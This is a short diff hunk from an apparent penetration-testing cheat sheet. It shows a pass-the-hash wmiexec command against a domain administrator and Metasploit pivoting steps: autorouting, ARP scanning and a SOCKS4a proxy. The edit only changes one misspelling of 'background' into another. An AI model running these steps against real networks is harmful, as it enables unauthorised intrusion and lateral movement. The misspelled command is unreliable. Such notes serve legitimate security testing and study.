@@ -141,7 +141,7 @@ wmiexec.py -debug -hashes xxxxxxxxxxxxxx:xxxxxxx  administrator@192.168.255.10
 ## Pivoting network
 (meterpreter) run autoroute -s 192.168.255.0/24  
 (meterpreter) run post/windows/gather/arp_scanner rhosts=192.168.255.0/24  
-(meterpreter) backgroupd
+(meterpreter) backgroud  
 (msf) use auxiliary/server/socks4a  
 (msf) set SRVHOST 0.0.0.0  
 (msf) set SRVPORT 9999  
